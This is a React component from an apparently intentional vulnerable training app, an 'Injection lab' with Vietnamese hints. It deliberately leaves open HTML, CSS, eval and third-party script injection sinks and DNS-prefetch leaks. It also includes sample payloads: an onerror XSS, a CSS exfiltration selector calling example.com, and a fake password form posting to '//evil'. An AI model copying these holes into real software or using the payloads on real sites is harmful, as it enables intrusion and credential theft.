import React, { useEffect, useState } from "react";
import { useSearchParams } from "react-router-dom";

/* [VULN #12] HTML injection, [#13] CSS injection, [#14] JS injection (eval),
   [#31] third-party script injection, [#53] DNS prefetch leak, [#56] mixed
   content, [#57] meta refresh injection, [#55] CSP already permissive. */
export default function Injection() {
  const [params] = useSearchParams();
  const [html, setHtml] = useState('<b style="color:#3fb950">Hello</b> <img src=x onerror=alert(1)>');
  const [css, setCss] = useState('body { background: #101 } .card { border: 1px solid #f85149 } input[value^="a"] { background: url("https://example.com/log?val="); }');
  const [js, setJs] = useState('document.title = "hacked " + Date.now()');
  const [scriptSrc, setScriptSrc] = useState("/3rd-party-widget.js");
  const [mixUrl, setMixUrl] = useState("http://neverssl.com/favicon.ico");
  const [mixResult, setMixResult] = useState("");

  // [VULN #53] dns-prefetch / preconnect to attacker host from query
  useEffect(() => {
    const host = params.get("prefetch");
    if (host) {
      const link = document.createElement("link");
      link.rel = "dns-prefetch";
      link.href = `//${host}`;
      document.head.appendChild(link);
      const pc = document.createElement("link");
      pc.rel = "preconnect";
      pc.href = `https://${host}`;
      document.head.appendChild(pc);
    }
  }, [params]);

  function injectHtml() {
    document.getElementById("html-inject").innerHTML = html; // [VULN #12] sink
  }
  function injectCss() {
    document.getElementById("css-inject").textContent = css; // [VULN #13] raw CSS -> exfil via url()
  }
  function injectJs() {
    try {
      // eslint-disable-next-line no-eval
      new Function(js)(); // [VULN #14] client-side JS injection
    } catch (e) {
      document.getElementById("js-out").textContent = "Error: " + e.message;
    }
  }
  function injectScript() {
    const s = document.createElement("script");
    s.src = scriptSrc; // [VULN #31] attacker-controlled script src, no SRI
    s.onerror = () => (document.getElementById("js-out").textContent = "script load failed (xem console)");
    document.body.appendChild(s);
  }
  function tryMixed() {
    setMixResult("");
    const img = new Image();
    img.onload = () => setMixResult("loaded (nếu được auto-upgrade sang https)");
    img.onerror = () => setMixResult("BLOCKED — browser chặn mixed content. Xem console.");
    img.src = mixUrl; // [VULN #56]
  }

  return (
    <div>
      <h1>Injection lab (client-side)</h1>

      <div className="card">
        <h2>HTML injection (#12)</h2>
        <div className="row">
          <input value={html} onChange={(e) => setHtml(e.target.value)} style={{ flex: 1 }} />
          <button className="primary" onClick={injectHtml}>
            Inject
          </button>
        </div>
        <div id="html-inject" className="comment" />
        <p className="hint">
          Khác XSS thuần? Không — HTML injection là dạng gốc; payload form login giả (phishing) cũng chạy:{" "}
          <code>{'<form action="//evil"><input name=pass type=password>'}</code>
        </p>
      </div>

      <div className="card">
        <h2>CSS injection (#13)</h2>
        <div className="row">
          <input value={css} onChange={(e) => setCss(e.target.value)} style={{ flex: 1 }} />
          <button className="primary" onClick={injectCss}>
            Inject CSS
          </button>
        </div>
        <style id="css-inject" />
        <p className="hint">
          CSS cũng exfil dữ liệu: selector attribute <code>input[value^="a"]</code> tải ảnh khi value bắt đầu bằng
          "a" — brute-force từng ký tự → đọc nội dung input (một biến thể của XS-Leak).
        </p>
      </div>

      <div className="card">
        <h2>JavaScript injection (#14) & third-party script (#31)</h2>
        <div className="row">
          <input value={js} onChange={(e) => setJs(e.target.value)} style={{ flex: 1 }} />
          <button className="danger" onClick={injectJs}>
            Run JS (new Function)
          </button>
        </div>
        <div className="row">
          <input value={scriptSrc} onChange={(e) => setScriptSrc(e.target.value)} style={{ flex: 1 }} />
          <button className="danger" onClick={injectScript}>
            Load &lt;script src&gt; (không SRI)
          </button>
        </div>
        <pre id="js-out" />
        <p className="hint">
          <code>/3rd-party-widget.js</code> "độc hại" thật: loot localStorage/cookies + hook <code>window.fetch</code>{" "}
          để bắt token — xem kết quả ở nút Xem attacker view trong trang <b>Storage lab</b> hoặc{" "}
          <code>GET /api/telemetry</code>.
        </p>
      </div>

      <div className="card">
        <h2>DNS prefetch leak (#53)</h2>
        <p className="hint">
          Thêm <code>?prefetch=attacker-log.tld</code> vào URL — client tạo{" "}
          <code>&lt;link rel=dns-prefetch&gt;</code> → browser phân giải DNS của attacker host ngay cả khi không
          request → leak qua DNS log.
        </p>
      </div>

      <div className="card">
        <h2>Mixed content (#56)</h2>
        <div className="row">
          <input value={mixUrl} onChange={(e) => setMixUrl(e.target.value)} style={{ flex: 1 }} />
          <button onClick={tryMixed}>Load http:// resource</button>
        </div>
        {mixResult && <pre>{mixResult}</pre>}
        <p className="hint">Trang https tải http resource — browser chặn (console hiện cảnh báo mixed content).</p>
      </div>
    </div>
  );
}
